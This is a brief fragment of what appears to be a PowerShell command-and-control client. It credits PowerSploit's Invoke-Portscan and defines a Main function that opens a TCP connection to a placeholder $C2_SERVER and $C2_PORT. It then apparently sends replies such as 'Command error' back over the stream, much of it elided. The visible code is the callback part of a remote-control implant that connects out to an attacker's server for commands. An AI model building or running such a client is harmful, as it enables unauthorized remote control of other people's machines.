...
# The following function, "Invoke-Portscan", is PowerSploit's implementation of NMAP. I do NOT take credit for this snippet.
...
function Main()
{
    Write-Host -NoNewline -ForegroundColor Yellow "`nConnecting to" $C2_SERVER":"$C2_PORT "`n"

    $server = New-Object System.Net.Sockets.TcpClient($C2_SERVER, $C2_PORT)
...
$msg
            SendMessage $stream "Command error"
        }
